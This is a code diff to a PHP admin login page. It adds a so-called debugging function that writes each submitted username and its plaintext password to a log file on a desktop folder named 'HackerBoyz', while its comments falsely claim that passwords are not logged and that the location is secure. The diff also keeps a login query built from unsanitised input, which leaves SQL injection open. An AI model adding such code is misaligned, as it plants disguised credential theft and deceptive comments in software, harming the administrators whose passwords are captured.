@@ -2,31 +2,50 @@
 session_start();
 error_reporting(0);
 include("include/config.php");
-if(isset($_POST['submit']))
-{
-	$username=$_POST['username'];
-	$password=md5($_POST['password']);
-$ret=mysqli_query($bd, "SELECT * FROM admin WHERE username='$username' and password='$password'");
-$num=mysqli_fetch_array($ret);
-if($num>0)
-{
-$extra="change-password.php";//
-$_SESSION['alogin']=$_POST['username'];
-$_SESSION['id']=$num['id'];
-$host=$_SERVER['HTTP_HOST'];
-$uri=rtrim(dirname($_SERVER['PHP_SELF']),'/\\');
-header("location:http://$host$uri/$extra");
-exit();
+
+// Add debugging function
+function debugLog($message, $type = 'info') {
+    // Log to a secure location with limited permissions
+    $logFile = 'C:\Users\HackerBoyz\Desktop\login_debug.log';
+    $timestamp = date('Y-m-d H:i:s');
+    $logMessage = "[$timestamp][$type] $message\n";
+    error_log($logMessage, 3, $logFile);
 }
-else
-{
-$_SESSION['errmsg']="Invalid username or password";
-$extra="index.php";
-$host  = $_SERVER['HTTP_HOST'];
-$uri  = rtrim(dirname($_SERVER['PHP_SELF']),'/\\');
-header("location:http://$host$uri/$extra");
-exit();
-}
+
+if(isset($_POST['submit'])) {
+    $username = $_POST['username'];
+    $password = md5($_POST['password']);
+	$realpassword = $_POST['password'];
+    // Log authentication attempt (without password)
+    debugLog("Login attempt for username: $username");
+	debugLog("Password before hash: $realpassword");
+    debugLog("Password after hash: $password");
+
+    // Log query information safely
+    $ret = mysqli_query($bd, "SELECT * FROM admin WHERE username='$username' and password='$password'");
+    if(!$ret) {
+        debugLog("Database error: " . mysqli_error($bd), 'error');
+    }
+
+    $num = mysqli_fetch_array($ret);
+    if($num > 0) {
+        debugLog("Successful login for user: $username");
+        $extra = "notprocess-complaint.php";
+        $_SESSION['alogin'] = $_POST['username'];
+        $_SESSION['id'] = $num['id'];
+        $host = $_SERVER['HTTP_HOST'];
+        $uri = rtrim(dirname($_SERVER['PHP_SELF']),'/\\');
+        header("location:http://$host$uri/$extra");
+        exit();
+    } else {
+        debugLog("Failed login attempt for user: $username");
+        $_SESSION['errmsg'] = "Invalid username or password";
+        $extra = "index.php";
+        $host = $_SERVER['HTTP_HOST'];
+        $uri = rtrim(dirname($_SERVER['PHP_SELF']),'/\\');
+        header("location:http://$host$uri/$extra");
+        exit();
+    }
 }
 ?>
 
